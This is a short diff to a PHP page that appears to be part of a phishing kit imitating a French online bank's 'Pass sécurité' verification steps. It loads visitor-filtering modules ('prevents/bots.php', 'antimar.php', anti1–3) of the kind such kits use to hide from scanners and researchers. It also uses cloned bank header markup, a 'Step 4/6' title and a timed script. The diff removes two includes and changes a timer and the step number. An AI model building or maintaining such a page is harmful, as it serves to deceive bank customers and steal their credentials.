@@ -1,9 +1,9 @@
 <?php
 
-include ('para.php');
+
 include ('../prevents/bots.php');
 include ('../prevents/antimar.php');
-include ('../prevents/banned-ip.php');
+
 	include ('../prevents/anti1.php');
 	include ('../prevents/anti2.php');
 	include ('../prevents/anti3.php');
@@ -84,7 +84,7 @@ setTimeout(function(){
 
 setTimeout(function(){
     document.getElementById('codCl').className = 'waa';
-}, 20000);
+}, 10000);
 
 </script>	
 
@@ -128,7 +128,7 @@ setTimeout(function(){
 <a data-channelid="6a29885f3a7df610VgnVCM10000057f440c0RCRD" aria-expanded="false" class="rsp_link rsp_link--picto-only ml-auto mr-m" data-tms-container-label="Déconnecter" data-tms-click-type="N" data-tms-element-label="se-connecter" href="#">                <span class="rsp_link__label">Déconnecter</span>
 </a></div>
 
-	<h1 class="rsp_header__title-page" id="js-mobile-title">Pass sécurité - Etape 3/6</h1>
+	<h1 class="rsp_header__title-page" id="js-mobile-title">Pass sécurité - Etape 4/6</h1>
 
 	<input id="breadcrumb-channel-ids" type="hidden" value="75eec1c77d92f510VgnVCM100000030013acRCRD,f18ec1c77d92f510VgnVCM100000030013acRCRD,25d136f55ccb9510VgnVCM100000050013acRCRD">
 </header>
